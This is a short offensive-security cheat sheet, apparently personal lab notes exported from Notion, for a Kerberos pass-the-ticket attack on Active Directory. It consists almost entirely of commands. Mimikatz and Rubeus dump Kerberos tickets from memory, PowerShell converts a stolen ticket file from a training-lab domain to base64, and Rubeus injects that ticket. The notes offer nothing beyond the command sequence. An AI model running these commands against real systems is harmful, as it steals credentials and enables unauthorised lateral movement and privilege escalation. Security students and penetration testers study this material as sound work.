# Rubeus: Pass the Ticket using Base64

OS: Active_Directory, Windows
Description: Pass the Ticket using Base64
Security Domains: Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21), Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: windows (https://www.notion.so/windows-1454c8e52376809bb701cef01e9f111a?pvs=21)

### Export Tickets from Mimikatz

```jsx
*sekurlsa*::tickets /export
```

### Rubeus

```jsx
Rubeus.exe dump /nowrap
```

### Convert Kirbi to base64

```jsx
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

```jsx
Rubeus.exe ptt /ticket:BASE_64
```